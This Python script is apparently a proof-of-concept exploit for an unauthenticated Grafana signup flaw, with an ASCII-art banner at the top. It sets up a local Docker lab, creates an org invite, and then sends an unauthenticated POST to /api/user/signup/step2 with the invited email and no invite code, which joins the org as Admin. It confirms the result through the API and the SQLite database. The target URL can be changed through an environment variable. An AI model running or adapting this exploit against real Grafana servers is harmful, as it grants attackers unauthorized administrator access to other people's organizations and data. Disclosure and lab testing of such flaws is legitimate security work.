#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: grafana-signup-invite-join (High: 8.1)
#  Vendor: Grafana OSS (Grafana Labs)
#  Versions: Grafana OSS 13.2.3 with allow_sign_up
#  Impact: Unauth SignUpStep2 joins pending org invites without the invite code
#  Requires: unauth POST /api/user/signup/step2 with invited email
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "grafana-signup-invite-join"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: SignUpStep2 joins pending org invites without the invite code."""


import base64
import http.cookiejar
import json
import os
import sqlite3
import subprocess
import tempfile
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "GRAFANA-SIGNUP-INVITE-JOIN"
WITNESS = "GRAFANA-SIGNUP-INVITE-JOIN-WITNESS"
BASE = os.environ.get("GRAFANA_URL", "http://127.0.0.1:19350").rstrip("/")
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "grafana-signup-invite-join")
HERE = Path(__file__).resolve().parent
ADMIN_USER = "admin"
ADMIN_PASS = "LabAdminPass1"
INVITE_ORG = "invite-org"
INVITEE_EMAIL = "invitee@lab.invalid"
INVITEE_LOGIN = "invitee"
CONTROL_EMAIL = "control@lab.invalid"
CONTROL_LOGIN = "controluser"
PASSWORD = "LabInviteJoin1!"
STEP2_CODE = ""


@dataclass
class HttpResult:
    status: int
    body: str
    json: Any
    headers: dict[str, str]


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


class Client:
    def __init__(self, basic: tuple[str, str] | None = None) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.basic = basic

    def request(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
        org_id: int | None = None,
        timeout: int = 30,
    ) -> HttpResult:
        url = path if path.startswith("http") else f"{BASE}{path}"
        headers = {"Accept": "application/json"}
        data = None
        if payload is not None:
            data = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"
        if self.basic is not None:
            token = base64.b64encode(f"{self.basic[0]}:{self.basic[1]}".encode("utf-8")).decode("ascii")
            headers["Authorization"] = f"Basic {token}"
        if org_id is not None:
            headers["X-Grafana-Org-Id"] = str(org_id)
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                hdrs = {k.lower(): v for k, v in resp.headers.items()}
                parsed: Any = None
                if body:
                    try:
                        parsed = json.loads(body)
                    except json.JSONDecodeError:
                        parsed = None
                return HttpResult(int(resp.status), body, parsed, hdrs)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            parsed = None
            if body:
                try:
                    parsed = json.loads(body)
                except json.JSONDecodeError:
                    parsed = None
            hdrs = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
            return HttpResult(int(exc.code), body, parsed, hdrs)
        except Exception as exc:
            return HttpResult(0, sanitize(str(exc)), None, {})


def as_dict(value: Any) -> dict[str, Any]:
    return value if isinstance(value, dict) else {}


def as_list(value: Any) -> list[Any]:
    return value if isinstance(value, list) else []


def compose_cp_db(dest: Path) -> bool:
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE,
            "cp",
            "grafana:/var/lib/grafana/grafana.db",
            str(dest),
        ],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    if proc.returncode != 0:
        log(f"IOC sqlite-copy-fail rc={proc.returncode} err={sanitize(proc.stderr or proc.stdout)}")
        return False
    return dest.is_file() and dest.stat().st_size > 0


def sqlite_invitee_roles(db_path: Path) -> list[tuple[int, str, str]]:
    con = sqlite3.connect(str(db_path))
    try:
        rows = con.execute(
            """
            SELECT ou.org_id, o.name, ou.role
            FROM org_user ou
            JOIN "user" u ON u.id = ou.user_id
            JOIN org o ON o.id = ou.org_id
            WHERE LOWER(u.email) = LOWER(?)
            ORDER BY ou.org_id
            """,
            (INVITEE_EMAIL,),
        ).fetchall()
        return [(int(r[0]), str(r[1]), str(r[2])) for r in rows]
    finally:
        con.close()


def sqlite_temp_status(db_path: Path) -> list[tuple[str, int, str, str, int]]:
    con = sqlite3.connect(str(db_path))
    try:
        rows = con.execute(
            """
            SELECT email, org_id, role, status, length(code)
            FROM temp_user
            WHERE LOWER(email) = LOWER(?)
            ORDER BY id
            """,
            (INVITEE_EMAIL,),
        ).fetchall()
        return [(str(r[0]), int(r[1]), str(r[2]), str(r[3]), int(r[4])) for r in rows]
    finally:
        con.close()


def org_role(orgs: list[Any], org_id: int) -> str:
    for item in orgs:
        row = as_dict(item)
        if int(row.get("orgId") or 0) == org_id:
            return str(row.get("role") or "")
    return ""


def main() -> int:
    admin = Client(basic=(ADMIN_USER, ADMIN_PASS))
    health = admin.request("GET", "/api/health")
    version = str(as_dict(health.json).get("version") or "")
    db_ok = str(as_dict(health.json).get("database") or "")
    log(f"IOC health status={health.status} version={version} database={db_ok}")
    if health.status != 200 or db_ok != "ok":
        fail(f"health not ok status={health.status} body={sanitize(health.body)}")

    admin_user = admin.request("GET", "/api/user")
    if admin_user.status != 200:
        fail(f"admin /api/user status={admin_user.status} body={sanitize(admin_user.body)}")
    log(
        "IOC admin-login "
        f"login={as_dict(admin_user.json).get('login')} "
        f"isGrafanaAdmin={as_dict(admin_user.json).get('isGrafanaAdmin')}"
    )

    created = admin.request("POST", "/api/orgs", payload={"name": INVITE_ORG})
    org_id = int(as_dict(created.json).get("orgId") or 0)
    log(f"IOC create-org status={created.status} orgId={org_id} body={sanitize(created.body)}")
    if created.status != 200 or org_id <= 1:
        fail(f"create org failed status={created.status} orgId={org_id} body={sanitize(created.body)}")

    invite = admin.request(
        "POST",
        "/api/org/invites",
        payload={
            "loginOrEmail": INVITEE_EMAIL,
            "name": "invitee",
            "role": "Admin",
            "sendEmail": False,
        },
        org_id=org_id,
    )
    log(f"IOC invite status={invite.status} body={sanitize(invite.body)}")
    if invite.status != 200:
        fail(f"invite failed status={invite.status} body={sanitize(invite.body)}")

    pending = admin.request("GET", "/api/org/invites", org_id=org_id)
    invites = as_list(pending.json)
    if pending.status != 200 or not invites:
        fail(f"pending invites status={pending.status} body={sanitize(pending.body)}")
    row = as_dict(invites[0])
    invite_code = str(row.get("code") or "")
    invite_role = str(row.get("role") or "")
    invite_email = str(row.get("email") or "")
    log(
        "IOC pending-invite "
        f"email={invite_email} role={invite_role} code-len={len(invite_code)} orgId={row.get('orgId')}"
    )
    if invite_email.lower() != INVITEE_EMAIL or invite_role != "Admin" or len(invite_code) != 30:
        fail(f"unexpected pending invite email={invite_email} role={invite_role} code-len={len(invite_code)}")
    if STEP2_CODE == invite_code:
        fail("lab would have sent the invite code; abort")

    control = Client()
    control_signup = control.request(
        "POST",
        "/api/user/signup/step2",
        payload={
            "email": CONTROL_EMAIL,
            "username": CONTROL_LOGIN,
            "name": "control",
            "password": PASSWORD,
            "code": STEP2_CODE,
            "orgName": "",
        },
    )
    log(f"IOC control-step2 status={control_signup.status} body={sanitize(control_signup.body)}")
    if control_signup.status != 200:
        fail(f"control signup status={control_signup.status} body={sanitize(control_signup.body)}")
    control_orgs = control.request("GET", "/api/user/orgs")
    control_roles = as_list(control_orgs.json)
    control_invite_role = org_role(control_roles, org_id)
    log(
        "IOC control-orgs "
        f"status={control_orgs.status} invite-org-role={control_invite_role or 'none'} "
        f"count={len(control_roles)}"
    )
    if control_invite_role:
        fail(f"control user joined invite org role={control_invite_role}")

    attacker = Client()
    step2_payload = {
        "email": INVITEE_EMAIL,
        "username": INVITEE_LOGIN,
        "name": "invitee",
        "password": PASSWORD,
        "code": STEP2_CODE,
        "orgName": "",
    }
    if invite_code and invite_code in json.dumps(step2_payload):
        fail("invite code leaked into step2 payload")
    step2 = attacker.request("POST", "/api/user/signup/step2", payload=step2_payload)
    step2_code = str(as_dict(step2.json).get("code") or "")
    log(f"IOC invitee-step2 status={step2.status} redirect={step2_code} body={sanitize(step2.body)}")
    if step2.status != 200:
        fail(f"invitee signup status={step2.status} body={sanitize(step2.body)}")
    if step2_code != "redirect-to-select-org":
        fail(f"step2 did not join invite redirect={step2_code}")

    me = attacker.request("GET", "/api/user")
    me_login = str(as_dict(me.json).get("login") or "")
    me_email = str(as_dict(me.json).get("email") or "")
    log(f"IOC invitee-me status={me.status} login={me_login} email={me_email}")
    if me.status != 200 or me_email.lower() != INVITEE_EMAIL:
        fail(f"invitee session missing status={me.status} email={me_email}")

    orgs = attacker.request("GET", "/api/user/orgs")
    org_rows = as_list(orgs.json)
    joined_role = org_role(org_rows, org_id)
    log(f"IOC invitee-orgs status={orgs.status} invite-org-role={joined_role} count={len(org_rows)}")
    if joined_role != "Admin":
        fail(f"invitee not Admin in invited org role={joined_role} orgs={sanitize(orgs.body)}")

    users = admin.request("GET", "/api/org/users", org_id=org_id)
    admin_seen = False
    for item in as_list(users.json):
        row = as_dict(item)
        if str(row.get("email") or "").lower() == INVITEE_EMAIL:
            admin_seen = str(row.get("role") or "") == "Admin"
            log(f"IOC org-users email={row.get('email')} role={row.get('role')} userId={row.get('userId')}")
    if not admin_seen:
        fail(f"admin org users missing invitee Admin body={sanitize(users.body)}")

    still_pending = admin.request("GET", "/api/org/invites", org_id=org_id)
    leftover = [
        as_dict(item)
        for item in as_list(still_pending.json)
        if str(as_dict(item).get("email") or "").lower() == INVITEE_EMAIL
    ]
    log(f"IOC pending-after count={len(leftover)}")
    if leftover:
        fail("invite still pending after step2")

    sqlite_role = ""
    sqlite_status = ""
    with tempfile.TemporaryDirectory() as tmp:
        db_path = Path(tmp) / "grafana.db"
        if compose_cp_db(db_path):
            roles = sqlite_invitee_roles(db_path)
            temps = sqlite_temp_status(db_path)
            log(f"IOC sqlite-org-user rows={roles}")
            log(f"IOC sqlite-temp-user rows={temps}")
            for oid, name, role in roles:
                if oid == org_id:
                    sqlite_role = role
            if temps:
                sqlite_status = temps[-1][3]
            if sqlite_role != "Admin":
                fail(f"sqlite invite org role={sqlite_role} rows={roles}")
            if sqlite_status != "Completed":
                fail(f"sqlite temp status={sqlite_status} rows={temps}")
        else:
            fail("sqlite copy failed")

    success(
        "version="
        f"{version} invite-org={org_id} invite-code-len={len(invite_code)} "
        f"step2-code-sent=empty step2-redirect={step2_code} "
        f"api-role={joined_role} sqlite-role={sqlite_role} temp-status={sqlite_status} "
        f"control-invite-org-role=none"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

